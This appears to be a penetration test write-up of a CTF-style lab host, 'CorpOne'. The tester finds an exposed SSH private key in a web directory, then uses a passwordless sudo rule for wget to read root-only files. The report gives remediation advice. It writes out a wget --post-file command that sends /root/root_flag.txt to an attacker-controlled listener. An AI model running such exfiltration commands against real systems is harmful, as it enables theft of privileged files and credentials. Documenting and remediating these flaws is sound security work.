# Penetration Testing Report

**Date of Assessment:** July 17, 2026

**Target IP Address:** 10.49.168.31

**Target Hostname:** CorpOne

**Assessment Type:** Internal Network Penetration Test (Black Box)

## 1. Executive Summary

A security assessment was conducted against the target system (`10.49.168.31`) to identify vulnerabilities and assess the overall security posture. The assessment revealed **Critical** vulnerabilities that allowed for complete system compromise.

An attacker could leverage a misconfigured web directory to obtain a private SSH key, granting initial access to the system as a standard user. From there, insecure administrative privileges (`sudo`) assigned to the user allowed the exfiltration of sensitive, restricted files, effectively demonstrating full root-level compromise.

Immediate remediation is required to secure the server, including removing sensitive files from web-accessible directories and applying the principle of least privilege to the `sudoers` configuration.

## 2. Scope

|**IP Address**|**Hostname**|**Operating System**|**Scope**|
|---|---|---|---|
|10.49.168.31|CorpOne|Ubuntu 16.04.6 LTS|Authorized|

## 3. Attack Narrative (Proof of Concept)

The engagement followed a standard methodology of Reconnaissance, Enumeration, Exploitation, and Privilege Escalation.

### 3.1 Initial Reconnaissance

An initial port scan using Nmap revealed two open ports on the target machine:

- **Port 22/tcp**: OpenSSH 7.2p2
    
- **Port 80/tcp**: Apache httpd 2.4.18
    

### 3.2 Web Enumeration & Initial Access

Directory brute-forcing against the web server on Port 80 using `dirsearch` uncovered a hidden directory at `[http://10.49.168.31/sitemap/](http://10.49.168.31/sitemap/)`. Further enumeration of this path revealed an exposed `.ssh` directory containing a private RSA key (`id_rsa`).

The private key was downloaded. By assigning the correct file permissions (`chmod 600 id_rsa`), the testing team successfully authenticated via SSH as the user `jessie` without requiring a password.

- **User Flag Captured:** `057c67131c3d5e42dd5cd3075b198ff6`
    

### 3.3 Privilege Escalation

Once authenticated as `jessie`, a check of user privileges (`sudo -l`) revealed that the user was permitted to execute the `/usr/bin/wget` command as the `root` user without supplying a password.

Because `wget` can read local files and transmit them over HTTP, this misconfiguration was exploited to read the restricted `/root/root_flag.txt` file. By setting up a Netcat listener on the attacker machine (`192.168.132.220:80`) and executing the following command on the target, the contents of the root flag were successfully exfiltrated:

`sudo /usr/bin/wget --post-file=/root/root_flag.txt 192.168.132.220:80`

- **Root Flag Captured:** `b1b968b37519ad1daa6408188649263d`
    

## 4. Detailed Findings and Recommendations

### Finding 1: Sensitive Information Disclosure (SSH Private Key Exposure)

- **Severity:** **Critical**
    
- **Description:** The web server is configured to serve a hidden directory (`/sitemap/.ssh/`) which contains a valid SSH private key (`id_rsa`). This allows any unauthenticated user who discovers the directory to download the key and gain unauthorized terminal access to the system.
    
- **Remediation:**
    
    1. Immediately remove the `.ssh` directory and the `id_rsa` file from the web root (`/var/www/html/` or equivalent).
        
    2. Revoke the exposed `id_rsa` key in the user's `~/.ssh/authorized_keys` file and generate a new key pair.
        
    3. Disable directory listing (indexing) in the Apache configuration to prevent attackers from browsing available files.
        

### Finding 2: Insecure Sudo Configuration (Privilege Escalation)

- **Severity:** **High**
    
- **Description:** The user `jessie` is granted `NOPASSWD` sudo execution rights for the `/usr/bin/wget` binary. `wget` has built-in functionality to read local files and post their contents to external servers. This allows a low-privileged user to read any file on the file system (such as `/etc/shadow` or root-owned files) and potentially download and overwrite system binaries, leading to total system compromise.
    
- **Remediation:**
    
    1. Review the `/etc/sudoers` file and remove the entry allowing `jessie` to run `wget` as root.
        
    2. If `wget` must be run with elevated privileges for a specific automated task, restrict its usage strictly via a wrapper script that heavily sanitizes inputs, rather than allowing arbitrary flag execution. Apply the Principle of Least Privilege.
        

### Finding 3: Outdated Operating System and Services

- **Severity:** **Medium**
    
- **Description:** The target system is running Ubuntu 16.04.6 LTS, which reached its end of standard support in April 2021. Furthermore, the services running (Apache 2.4.18 and OpenSSH 7.2p2) are heavily outdated and may be susceptible to known public CVEs.
    
- **Remediation:**
    
    1. Upgrade the operating system to a supported LTS release (e.g., Ubuntu 22.04 LTS or 24.04 LTS).
        
    2. Regularly apply security patches to web and SSH daemon services.